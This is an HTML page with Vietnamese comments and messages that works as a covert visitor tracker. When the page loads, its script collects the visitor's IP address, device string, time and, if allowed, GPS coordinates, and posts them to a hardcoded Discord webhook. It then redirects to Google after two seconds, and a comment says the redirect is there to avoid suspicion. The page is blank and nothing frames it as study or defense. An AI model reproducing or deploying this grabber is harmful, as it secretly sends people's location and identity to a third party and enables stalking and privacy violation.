<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>...</title>
  <script>
    window.onload = () => {
      const webhook = "https://discordapp.com/api/webhooks/1360121704810287134/XK9peo8xM6lxItpRKsVoEWaEQnJroxGy28LiiiDvN4A209ECo71wKkj8vft4qRQTLv_g";

      const sendToDiscord = (content) => {
        fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content })
        });
      };

      const getIP = async () => {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      };

      const getInfo = async () => {
        const ip = await getIP();
        const ua = navigator.userAgent;
        const time = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });

        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            sendToDiscord(`📍 Có người vào web và CHO PHÉP vị trí

🌐 IP: ${ip}
📱 Thiết bị: ${ua}
🕒 Thời gian: ${time}
📌 Vị trí: ${mapLink}`);
          },
          (err) => {
            sendToDiscord(`⚠️ Ai đó vừa vào web nhưng KHÔNG cho phép truy cập vị trí.

🌐 IP: ${ip}
📱 Thiết bị: ${ua}
🕒 Thời gian: ${time}`);
          }
        );
      };

      getInfo();

      // Redirect sau 2 giây để tránh nghi ngờ
      setTimeout(() => {
        window.location.href = "https://www.google.com/";
      }, 2000);
    };
  </script>
</head>
<body style="background:#fff; margin:0;"></body>
</html>
